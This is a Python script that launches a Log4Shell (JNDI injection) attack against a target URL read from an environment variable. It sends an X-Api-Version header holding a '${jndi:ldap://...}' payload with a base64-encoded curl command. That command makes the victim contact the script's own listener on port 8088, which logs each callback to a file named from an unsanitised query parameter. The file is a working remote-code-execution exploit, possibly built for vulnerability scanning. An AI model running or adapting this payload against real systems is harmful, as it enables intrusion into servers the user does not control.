from http.server import BaseHTTPRequestHandler, HTTPServer
import datetime
import socket 
import time
import requests
import os
import base64
import urllib.parse as urlparse



hostname=socket.gethostname()   
IPAddr=socket.gethostbyname(hostname)

hostName = IPAddr
serverPort = 8088

class MyServer(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urlparse.urlparse(self.path)
        try:
            params = dict([p.split('=') for p in parsed_path[4].split('&')])
        except:
            params = {}
        
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        message = f"{datetime.datetime.now()} {self.client_address[0]}\n"
        f = open(f"./app/{params.get('from').replace('.','-')}.txt", "a")
        print(message)
        f.write(message)
        f.close()


if __name__ == "__main__":        
    webServer = HTTPServer((hostName, serverPort), MyServer)
    print("Server started http://%s:%s" % (hostName, serverPort))
    
    endpoint = os.environ.get('ENDPOINT')
    message = f"curl -G {IPAddr}:8088 -d 'from={endpoint.split('://')[1].split(':')[0]}'"
    message_bytes = message.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')
    headers = { 'X-Api-Version': "${jndi:ldap://"+IPAddr+":1389/Basic/Command/Base64/"+base64_message+"}" }
    time.sleep(10)
    print(headers)

    requests.get(url=endpoint, headers=headers)
    try:
        webServer.serve_forever()

        
    except KeyboardInterrupt:
        pass

    webServer.server_close()
    print("Server stopped.")